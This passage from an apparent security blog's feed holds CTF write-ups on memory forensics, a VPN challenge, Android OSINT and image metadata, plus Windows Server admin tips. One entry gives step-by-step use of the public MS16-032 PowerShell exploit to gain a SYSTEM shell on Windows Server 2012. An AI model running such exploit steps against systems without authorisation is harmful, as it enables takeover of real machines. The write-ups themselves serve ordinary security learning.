<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw imageinfo</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div class="line">                     AS Layer2 : FileAddressSpace (/media/sf_Challenges/CTF/SECCON/forensic_100.raw)</div><div class="line">                      PAE type : PAE</div><div class="line">                           DTB : 0x34c000L</div><div class="line">                          KDBG : 0x80545ce0L</div><div class="line">          Number of Processors : 1</div><div class="line">     Image Type (Service Pack) : 3</div><div class="line">                KPCR for CPU 0 : 0xffdff000L</div><div class="line">             KUSER_SHARED_DATA : 0xffdf0000L</div><div class="line">           Image date and time : 2016-12-06 05:28:47 UTC+0000</div><div class="line">     Image local date and time : 2016-12-06 14:28:47 +0900</div></pre></td></tr></table></figure>
<p>Check the hosts file as the second hint say :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000217b748 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">DataSectionObject 0x0217b748   None   \Device\HarddiskVolume1\WINDOWS\system32\drivers\etc\hosts</div><div class="line"></div><div class="line">➜ ls</div><div class="line">file.None.0x819a3008.dat  forensic_100.raw  memoryanalysis.zip</div><div class="line"></div><div class="line">➜ cat file.None.0x819a3008.dat</div><div class="line"># Copyright (c) 1993-1999 Microsoft Corp.</div><div class="line">#</div><div class="line"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</div><div class="line">#</div><div class="line"># This file contains the mappings of IP addresses to host names. Each</div><div class="line"># entry should be kept on an individual line. The IP address should</div><div class="line"># be placed in the first column followed by the corresponding host name.</div><div class="line"># The IP address and the host name should be separated by at least one</div><div class="line"># space.</div><div class="line">#</div><div class="line"># Additionally, comments (such as these) may be inserted on individual</div><div class="line"># lines or following the machine name denoted by a &apos;#&apos; symbol.</div><div class="line">#</div><div class="line"># For example:</div><div class="line">#</div><div class="line">#      102.54.94.97     rhino.acme.com          # source server</div><div class="line">#       38.25.63.10     x.acme.com              # x client host</div><div class="line"></div><div class="line">127.0.0.1       localhost</div><div class="line">153.127.200.178    crattack.tistory.com #</div></pre></td></tr></table></figure>
<p>So the DNS entry crattack.tistory.com is pointing on the 153.127.200.178 IP adress.</p>
<p>List processus to see what was running when the memory was captured :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 pstree</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Name                                                  Pid   PPid   Thds   Hnds Time</div><div class="line">-------------------------------------------------- ------ ------ ------ ------ ----</div><div class="line"> 0x8231f698:explorer.exe                             1556   1520     15    466 2016-12-06 05:27:10 UTC+0000</div><div class="line">. 0x821f8438:vmtoolsd.exe                            1856   1556      3    129 2016-12-06 05:27:11 UTC+0000</div><div class="line">. 0x819b4380:tcpview.exe                             3308   1556      2     84 2016-12-06 05:28:42 UTC+0000</div><div class="line">. 0x82267900:rundll32.exe                            1712   1556      2    144 2016-12-06 05:27:16 UTC+0000</div><div class="line">. 0x8216a5e8:DumpIt.exe                              3740   1556      1     25 2016-12-06 05:28:46 UTC+0000</div><div class="line">. 0x82170da0:ctfmon.exe                              1872   1556      1     87 2016-12-06 05:27:11 UTC+0000</div><div class="line"> 0x823c8660:System                                      4      0     58    259 1970-01-01 00:00:00 UTC+0000</div><div class="line">. 0x81a18020:smss.exe                                 540      4      3     19 2016-12-06 05:27:04 UTC+0000</div><div class="line">.. 0x82173da0:winlogon.exe                            628    540     24    541 2016-12-06 05:27:07 UTC+0000</div><div class="line">... 0x8216e670:services.exe                           672    628     15    286 2016-12-06 05:27:07 UTC+0000</div><div class="line">.... 0x81f46238:alg.exe                              2028    672      7    104 2016-12-06 05:27:16 UTC+0000</div><div class="line">.... 0x82312450:svchost.exe                          1036    672     87   1514 2016-12-06 05:27:08 UTC+0000</div><div class="line">..... 0x81f2cb20:wuauclt.exe                         3164   1036      5    107 2016-12-06 05:28:15 UTC+0000</div><div class="line">..... 0x82062b20:wuauclt.exe                          488   1036      7    132 2016-12-06 05:27:13 UTC+0000</div><div class="line">..... 0x81e56228:wscntfy.exe                          720   1036      1     37 2016-12-06 05:27:18 UTC+0000</div><div class="line">.... 0x82154880:vmacthlp.exe                          836    672      1     25 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x82151ca8:svchost.exe                           936    672     10    272 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x81e4b4b0:vmtoolsd.exe                          312    672      9    265 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81f92778:svchost.exe                          1088    672      7     83 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x81f00558:VGAuthService.e                       196    672      2     60 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81e18da0:svchost.exe                           848    672     20    216 2016-12-06 05:27:08 UTC+0000</div><div class="line">..... 0x81e89200:wmiprvse.exe                         596    848     12    255 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81e41928:svchost.exe                          1320    672     12    183 2016-12-06 05:27:10 UTC+0000</div><div class="line">.... 0x81f0dbe0:spoolsv.exe                          1644    672     15    133 2016-12-06 05:27:10 UTC+0000</div><div class="line">.... 0x81f65da0:svchost.exe                          1776    672      2     23 2016-12-06 05:27:10 UTC+0000</div><div class="line">..... 0x8225bda0:IEXPLORE.EXE                         380   1776     22    385 2016-12-06 05:27:19 UTC+0000</div><div class="line">...... 0x8229f7e8:IEXPLORE.EXE                       1080    380     19    397 2016-12-06 05:27:21 UTC+0000</div><div class="line">.... 0x81e4f560:svchost.exe                          1704    672      5    107 2016-12-06 05:27:10 UTC+0000</div><div class="line">... 0x81f8c9a0:lsass.exe                              684    628     26    374 2016-12-06 05:27:07 UTC+0000</div><div class="line">.. 0x81ef6da0:csrss.exe                               604    540     11    480 2016-12-06 05:27:07 UTC+0000</div><div class="line"> 0x81e886f0:GoogleUpdate.ex                           372   1984      7    138 2016-12-06 05:27:13 UTC+0000</div></pre></td></tr></table></figure>
<p>We see a IEXPLORE.EXE. Why don’t check its history ?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 iehistory</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">**************************************************</div><div class="line">Process: 1080 IEXPLORE.EXE</div><div class="line">Cache type &quot;DEST&quot; at 0x201ca83</div><div class="line">Last modified: 2016-12-06 14:28:40 UTC+0000</div><div class="line">Last accessed: 2016-12-06 05:28:42 UTC+0000</div><div class="line">URL: SYSTEM@http://crattack.tistory.com/entry/Data-Science-import-pandas-as-pd</div><div class="line">Title: Security &amp;amp; Reverse :: [Data Science] Pandas - \),</div></pre></td></tr></table></figure>
<p>If we visit this URL without matching the IP adress in the host file, we are on a CTF site. There is no flag on this site…</p>
<p>But, if we match the IP adress with the URL, we have a file to download, and this file hold the flag :-)</p>
<p>Flag : SECCON{_h3110_w3_h4ve_fun<em>w4rg4m3</em>}</p>
<p><strong>Note</strong>: We could retrieve the IP adress with the connscan plugin, but it was impossible to determine that the crattack.tistory.com site was associated with this IP adress.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Manage local users and groups on Windows Server 2012</title>
    <link href="http://rawsec.ml/en/manage-local-users-and-groups-on-windows-server-2012/"/>
    <id>http://rawsec.ml/en/manage-local-users-and-groups-on-windows-server-2012/</id>
    <published>2016-12-04T23:00:00.000Z</published>
    <updated>2016-12-05T23:31:42.917Z</updated>
    
    <content type="html"><![CDATA[<ol>
<li>Open <strong>Server Manager</strong>.</li>
<li>Click <strong>Tools</strong>.</li>
<li>Select <strong>Computer Management</strong>.</li>
<li>Expand <strong>Local Users and Groups</strong>.</li>
<li>Select <strong>Users</strong> or <strong>Groups</strong>.</li>
<li>Double click on a user or a group.</li>
<li>Do your stuff.</li>
</ol>
<p><strong>Note</strong>: This works only for servers that are not Domain Controller (in this case just open <strong>Active Directory Users and Computer</strong>).</p>
]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;Open &lt;strong&gt;Server Manager&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Click &lt;strong&gt;Tools&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Select &lt;strong&gt;Computer Management&lt;/strong&gt;.&lt;
    
    </summary>
    
      <category term="windows" scheme="http://rawsec.ml/categories/windows/"/>
    
    
      <category term="windows" scheme="http://rawsec.ml/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Enable Remote Desktop Protocol (RDP) on Windows Server 2012</title>
    <link href="http://rawsec.ml/en/enable-remote-desktop-windows-server-2012/"/>
    <id>http://rawsec.ml/en/enable-remote-desktop-windows-server-2012/</id>
    <published>2016-12-04T23:00:00.000Z</published>
    <updated>2016-12-05T23:31:34.890Z</updated>
    
    <content type="html"><![CDATA[<p>To launch the Remote Desktop, there are two methods: CLI or GUI.<br>From both you will be able to allow or not remote connections and choose users that can connect via RDP.</p>
<h2 id="with-Command-Line-Interface-CLI"><a href="#with-Command-Line-Interface-CLI" class="headerlink" title="with Command Line Interface (CLI)"></a>with Command Line Interface (CLI)</h2><ol>
<li>Open <code>cmd.exe</code>.</li>
<li>Type <code>SystemPropertiesRemote</code>.</li>
<li>This command launches the <strong>System Properties</strong> window on the <strong>Remote</strong> tab.</li>
</ol>
<h2 id="with-Graphical-User-Interface-GUI"><a href="#with-Graphical-User-Interface-GUI" class="headerlink" title="with Graphical User Interface (GUI)"></a>with Graphical User Interface (GUI)</h2><ol>
<li>Open the <strong>Control Panel</strong>, various ways:<ul>
<li>Press <strong>Windows + X</strong> and click <strong>Control Panel</strong></li>
<li>or from the Smart Screen (<strong>Windows + C</strong> and click <strong>Start</strong>) click <strong>Control Panel</strong></li>
<li>or move mouse to thr right upper side of screen and click <strong>Settings</strong> and then <strong>Control Panel</strong></li>
<li>or <strong>Windows + R</strong> and type <code>control</code></li>
<li>or type <code>control</code> in <code>cmd.exe</code></li>
<li>or via <code>Explorer.exe</code> (<strong>Windows + E</strong>) type <strong>Control Panel</strong> in teh adress bar</li>
<li>etc… (easier with CLI right?).</li>
</ul>
</li>
<li>Click <strong>Advance System Settings</strong>, this launches the <strong>System Properties</strong>.</li>
<li>Select the <strong>Remote</strong> tab.</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;To launch the Remote Desktop, there are two methods: CLI or GUI.&lt;br&gt;From both you will be able to allow or not remote connections and cho
    
    </summary>
    
      <category term="windows" scheme="http://rawsec.ml/categories/windows/"/>
    
    
      <category term="windows" scheme="http://rawsec.ml/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Privilege Escalation (EoP) on Windows Server 2012 via PowerShell (PS)</title>
    <link href="http://rawsec.ml/en/privilege-escalation-on-windows-server-2012-via-powershell/"/>
    <id>http://rawsec.ml/en/privilege-escalation-on-windows-server-2012-via-powershell/</id>
    <published>2016-12-04T23:00:00.000Z</published>
    <updated>2016-12-05T23:31:48.367Z</updated>
    
    <content type="html"><![CDATA[<ol>
<li>Download <a href="https://www.exploit-db.com/download/39719" target="_blank" rel="external">this powershell script</a> and save it <code>39719.ps1</code>.</li>
<li>Open an unprivileged powershell terminal.</li>
<li>Go to the folder location where you saved the script.</li>
<li>Source the script: <code>. .\39719.ps1</code>.</li>
<li>Then type <code>Invoke-MS16-032</code>.</li>
<li>Let the magic happens, you just got a <strong>nt authority\system</strong> <code>cmd.exe</code>.</li>
</ol>
<p>I tested it on Windows Server 2012 R2 Datacenter Edition 64 bits but author tested it on others Windows.</p>
<p>You can read more about:</p>
<ul>
<li>the exploit on <a href="https://www.exploit-db.com/exploits/39719/" target="_blank" rel="external">Exploit Database</a>,</li>
<li>MS16-032 on <a href="https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html" target="_blank" rel="external">Google Project Zero</a>.</li>
</ul>
<p>Script infos:</p>
<ul>
<li>Author: Ruben Boonen (@FuzzySec)</li>
<li>Blog: <a href="http://www.fuzzysecurity.com/" target="_blank" rel="external">http://www.fuzzysecurity.com/</a></li>
<li>License: BSD 3-Clause</li>
<li>Required Dependencies: PowerShell v2+</li>
<li>Optional Dependencies: None</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;Download &lt;a href=&quot;https://www.exploit-db.com/download/39719&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;this powershell script&lt;/a&gt; and save it 
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="windows" scheme="http://rawsec.ml/categories/security/windows/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="windows" scheme="http://rawsec.ml/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 100 - Find The Gobblewonker - Network</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-network-Find-The-Gobblewonker/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-network-Find-The-Gobblewonker/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, network, admin, web</p>
<blockquote>
<p>Do you want to find yourself on an island wih monsters?<br>Here are cordinates of it 10.0.17.131<br>But it’s not as easy as it seems. You need a boat.<br>You will find the boat there: <a href="https://scoreboard.ctf.org.ru/vpn/YOU_TEAM_TOKEN.7z" target="_blank" rel="external">https://scoreboard.ctf.org.ru/vpn/YOU_TEAM_TOKEN.7z</a></p>
<p>You’ll need this boat for travelling to the other islands. Fair winds and following seas!</p>
<p><img src="http://juniors.ucoz.net/hqdefault.jpg" alt=""></p>
<p>M.Iu.Lupanov</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>Download your VPN archive.</li>
<li>Of course unzip it.</li>
<li>Connect with OpenVPN.</li>
<li>Go to <code>10.0.17.131</code>. And see:</li>
</ul>
<p><img src="http://i.imgur.com/DcI9hAc.png" alt=""></p>
<p>Flag was <code>q8mvbp8sFNPpFj2dZkEkweNEFdBIuhVYkEr2brnj2qstJ3QbAtklx0imht8pdb2PafDIXs3Sxojl3m5q</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="network" scheme="http://rawsec.ml/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 500 - Lost everything but hope - Forensics</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-forensics-Lost-everything-but-hope/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-forensics-Lost-everything-but-hope/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T22:20:14.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p><img src="https://i.imgur.com/s9I4kim.jpg" alt="https://i.imgur.com/s9I4kim.jpg">  </p>
<ul>
<li><em>screams</em>  </li>
<li>Mabel: What’s up, Gruncle???  </li>
<li>Stan: I left a phone here and went to the store to sell something useless. When I got back I saw this  </li>
<li><em>shows a broken mobile</em>  </li>
<li>Mabel: OMG!  </li>
<li>Soos: Gonna get some insulating tape.  </li>
<li>Stan: Restore the justice!  </li>
</ul>
<p>A few hours later  </p>
<ul>
<li>Dipper: Hm, who could do this?.. Soos, I managed to restore some files, maybe you can help to find something. Will you?  </li>
<li>Soos: Of course, Dipper.   </li>
</ul>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We have a <code>something.rar</code> file, and in it, there is a <code>sdcard</code> folder.<br>If we open it, we find data from an Android phone. After searching on the each folders, admin gave a <strong>hint</strong> on Telegram : <code>Someone who likes vkontakte</code>.</p>
<p>So I opened the <code>.vkontakte</code> folder and search any clue. There was an ogg file named <code>397087112_439151831</code> with size of 1Ko so we couldn’t listen anything. I had the idea that a audio conversation must be between 2 account of vkontakt so the numbers are reprenting an id of these account…<br>Let’s see if we can get a profile page of these accounts on vk.com :smirk: !</p>
<p>Go on <a href="https://vk.com/id397087112" target="_blank" rel="external">https://vk.com/id397087112</a>, we find a profile page of a pig nammed <code>Waddles Mabelpig</code>. This pig posted on the social network the flag !  </p>
<p>Flag: <code>waddles_the_d3stroyer</code> :tada:</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 200 - Clone Attack - Forensics</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-forensics-clone-attack/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-forensics-clone-attack/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, forensics</p>
<blockquote>
<p> Gravity Falls is under clones attack. Find the real Dipper and save the town</p>
<p><a href="https://yadi.sk/d/ekEIo3nwy22JC" target="_blank" rel="external">https://yadi.sk/d/ekEIo3nwy22JC</a>, <a href="http://juniors.ucoz.net/dipper2.png" target="_blank" rel="external">http://juniors.ucoz.net/dipper2.png</a></p>
<p><img src="https://i.imgbox.com/iiiv8xc8.png" alt=""></p>
<p>Lupanov M.Iu.<br><br></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><code>dipper2.jpg</code> is useless.</li>
<li>unzip <code>dipper.7z</code></li>
<li>We have 201 images:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">Ab9t2MDhgeCdtIWM.jpg  HjBQKJSOhcieolm4.jpg  n3dQQ0ZDx3S3UsBr.jpg  T1uPfBLnZwT4gnLy.jpg  zaDSq7pwGh4a38xy.jpg</div><div class="line">ABDOzIFq6epnCnhx.jpg  hk0hHu8tI5DkDyiV.jpg  N4M2CtJ7gr7Jzo9S.jpg  t1xoHMAR0IAkwfd7.jpg  Zb1RJWvpVjXFKfxq.jpg</div><div class="line">aBHn54lpn0JuymBI.jpg  HKjCtFdy5EL15cXH.jpg  N5muaN8pZFaQizT6.jpg  t2FNLj2HOKnT1naO.jpg  ZcAZFv16zVB2Xoih.jpg</div><div class="line">AbmIxXZ4ReLk7UYM.jpg  hlB31hrzrOU5RYQg.jpg  N5ZGl2k84vyFp5Br.jpg  t3sXG01KznKJiN9v.jpg  zCYJB6XDGlt8UB58.jpg</div><div class="line">ABNclrsAR0By1bUx.jpg  HLIqYcwvszKfJ2mh.jpg  n6bfa5irSSBzz1IU.jpg  t9IRCSMIJBrvArav.jpg  zD3o8PsmbXmRWNON.jpg</div><div class="line">ac9q61SRl4vlF0td.jpg  hmrrHYgpxaW6V6XU.jpg  n6BS4SVXzrkIRpsu.jpg  TBHJwtjbcXh2GYv9.jpg  zdd9UFYGdxytCbCz.jpg</div><div class="line">[...]</div></pre></td></tr></table></figure>
<ul>
<li>Let’s take a look at the first image:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ exiftool 07snLOxf2k0rRrT3.jpg</div><div class="line">ExifTool Version Number         : 10.20</div><div class="line">File Name                       : 07snLOxf2k0rRrT3.jpg</div><div class="line">Directory                       : .</div><div class="line">File Size                       : 26 kB</div><div class="line">File Modification Date/Time     : 2016:11:03 04:56:07+01:00</div><div class="line">File Access Date/Time           : 2016:11:25 16:47:44+01:00</div><div class="line">File Inode Change Date/Time     : 2016:11:25 16:48:53+01:00</div><div class="line">File Permissions                : rw-r--r--</div><div class="line">File Type                       : JPEG</div><div class="line">File Type Extension             : jpg</div><div class="line">MIME Type                       : image/jpeg</div><div class="line">JFIF Version                    : 1.01</div><div class="line">Resolution Unit                 : inches</div><div class="line">X Resolution                    : 72</div><div class="line">Y Resolution                    : 72</div><div class="line">Current IPTC Digest             : 1f6df1813fc08f735211d55b866d1cca</div><div class="line">Coded Character Set             : UTF8</div><div class="line">Envelope Record Version         : 4</div><div class="line">Object Name                     : Ксерокопия  номер  086</div><div class="line">Application Record Version      : 4</div><div class="line">Comment                         : Flag is MD5sum of this file. Its TRUE</div><div class="line">Image Width                     : 193</div><div class="line">Image Height                    : 400</div><div class="line">Encoding Process                : Progressive DCT, Huffman coding</div><div class="line">Bits Per Sample                 : 8</div><div class="line">Color Components                : 3</div><div class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</div><div class="line">Image Size                      : 193x400</div><div class="line">Megapixels                      : 0.077</div></pre></td></tr></table></figure>
<ul>
<li><code>Comment                         : Flag is MD5sum of this file. Its TRUE</code> but all images have the same comment.</li>
<li><code>Object Name                     : Ксерокопия  номер  086</code> means <code>n° of copie 086</code>, let’s fidn teh original:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ exiftool * | grep &apos;Object Name&apos;</div><div class="line">[...]</div><div class="line">Object Name                     : Ксерокопия  номер  644</div><div class="line">Object Name                     : Оригинальный Диппер</div><div class="line">Object Name                     : Ксерокопия  номер  702</div><div class="line">[...]</div></pre></td></tr></table></figure>
<ul>
<li>We found it, <code>Оригинальный Диппер</code> means <code>The original Dipper</code>:</li>
</ul>
